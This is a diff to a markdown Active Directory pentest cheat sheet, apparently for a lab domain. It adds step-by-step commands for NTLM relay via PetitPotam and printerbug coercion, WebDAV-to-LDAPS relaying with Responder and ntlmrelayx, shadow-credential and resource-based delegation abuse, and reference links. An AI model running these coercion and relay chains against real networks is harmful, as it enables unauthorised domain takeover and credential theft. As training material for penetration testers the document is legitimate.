@@ -403,7 +403,13 @@ py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --act
 py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --action add
 ```
 
-Once you have obtained the certificate, it can further use the Pass-The-Certificate attack to authenticate. 
+Once you have obtained the certificate, it can further use the [Pass-The-Certificate](#pass-the-certificate) attack to authenticate. 
+
+**References**
+* https://pentestlab.blog/2022/02/07/shadow-credentials/
+* https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
+* https://github.com/ShutdownRepo/pywhisker
+* https://github.com/eladshamir/Whisker
 
 # Weak GPO Permission
 ### Enumerate weak GPO Permission
@@ -668,8 +674,15 @@ python3 PetitPotam.py 192.168.86.193 192.168.86.182
 ```
 
 ### Shadow Credentials
+Additional Note: The target ldap server cannot be a CA server (ADCS) or else the attack won't work.
 ```
+# note that --remove-mic is only needed with NetNTLMv1. If not, you might want to use a WebDav coerce approach.
+ntlmrelayx.py -t ldap://dc01.range.net -smb2support --remove-mic --shadow-credentials --shadow-target 'ca01$'
 
+# coerce 
+py PetitPotam.py 192.168.86.193 192.168.86.182
+
+# use Pass-The-Certificate attack to authenticate
 ```
 
 ### ESC8
@@ -677,7 +690,29 @@ python3 PetitPotam.py 192.168.86.193 192.168.86.182
 ```
 
 ### Webdav to LDAP(S)
+1. Enumerate the environment if any servers/workstations have a webdav service enabled
 ```
+cme smb 192.168.86.0/24 -u rangeadm -p Password123 -M webdav
+```
+2. Setup a response (this step is required because we need our NETBIOS name in order for webdav to work). Disable(off) HTTP and SMB protocol in `/etc/response/Responder.conf` config file.
+```
+responder -I eth0
+```
+3. Setup ntlmrelayx.py targetting ldap(s) protocol
+```
+ntlmrelayx.py -t ldaps://dc01.range.net -smb2support -i
+```
+4. Use any of your coerce methods. In my case, i'll use printerbug.py. 
+```
+py printerbug.py -no-ping range.net/rangeadm:Password123@192.168.86.184 'WIN-6FQLURGYGLP@80/whatever'
+```
+5. A successful relay to ldap(s) protocol could be further escalated to [RBCD](#resource-based-constrained-delegation) or [Shadow Credentials](#shadow-credentials) attack. Below are the commands example.
+```
+# RBCD with ntlmrelayx.py
+ntlmrelayx.py -t ldaps://dc01.range.net -smb2support --delegate-access
+
+# Shadow Creds
+ntlmrelayx.py -t ldaps://dc01.range.net -smb2support --shadow-credentials --shadow-target 'ca01$'
 ```
 
 ### NetNTLMv1 to LDAP
